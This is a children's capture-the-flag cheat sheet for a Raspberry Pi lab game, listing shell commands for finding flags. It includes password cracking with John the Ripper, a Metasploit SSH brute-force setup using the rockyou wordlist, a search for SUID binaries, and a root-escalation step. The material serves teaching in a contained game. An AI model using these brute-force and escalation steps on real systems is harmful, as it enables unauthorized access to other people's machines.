# 🎮 CTF Kids' Commands Cheat Sheet
## Only What You Need for the Game!

---

## 🗂️ Moving Around & Looking for Flags

```bash
ls -la
```
*Show all files and folders, even hidden ones.*

```bash
cd foldername
```
*Go into a folder.*

```bash
cd ..
```
*Go up one folder.*

```bash
cat filename.txt
```
*Show what's inside a file (like a flag!).*

---

## 🔐 Logging In & Switching Users

```bash
ssh username@pi_ip
```
*Log in to a Raspberry Pi from your computer.*

```bash
su username
```
*Switch to another user (if you know their password).* 

---

## 🕵️‍♂️ Finding Hidden Stuff

```bash
ls -la
```
*See hidden files and folders (they start with a dot).* 

---

## 🔑 Decoding & Cracking Passwords

```bash
echo "ZWxsYXNlY3JldA==" | base64 -d
```
*Decode a base64 password hint (for Ella's account).* 

```bash
john hash.txt
```
*Crack a password hash using John the Ripper.*

---

## 🧰 Metasploit (for Brute Forcing)

```bash
msfconsole
```
*Start Metasploit.*

```bash
search ssh_login
```
*Find the SSH brute force tool.*

```bash
use auxiliary/scanner/ssh/ssh_login
```
*Pick the SSH brute force tool.*

```bash
set RHOSTS pi_ip
```
*Set the target Pi's address.*

```bash
set USERNAME pi_username
```
*Set the username to try.*

```bash
set PASS_FILE /usr/share/wordlists/rockyou.txt
```
*Set the password list to use.*

```bash
run
```
*Start the brute force attack!*

---

## 🗝️ Decrypting a File (Jack's Password)

```bash
openssl enc -aes-256-cbc -d -in encrypted_jack_password.bin -k "CTF2024"
```
*Unlock Jack's password file.*

---

## 🌐 Finding All the Pis

```bash
angryipscanner
```
*Open Angry IP Scanner (use the GUI to scan the network).* 

---

## 🏆 Getting Root (Final Flag)

```bash
find / -perm -4000 2>/dev/null
```
*Find special files that can help you become root.*

```bash
./suid_exploit
```
*Run the special file to get root access.*

```bash
cat /root/final_flag.txt
```
*Read the final flag!* 

---

## 📝 Taking Notes

```bash
echo "Found flag in /home/ella/flag4.txt" >> notes.txt
```
*Write down where you found a flag.*

---

**That's it! Use these commands to find all the flags. Good luck and have fun! 🏴‍☠️** 
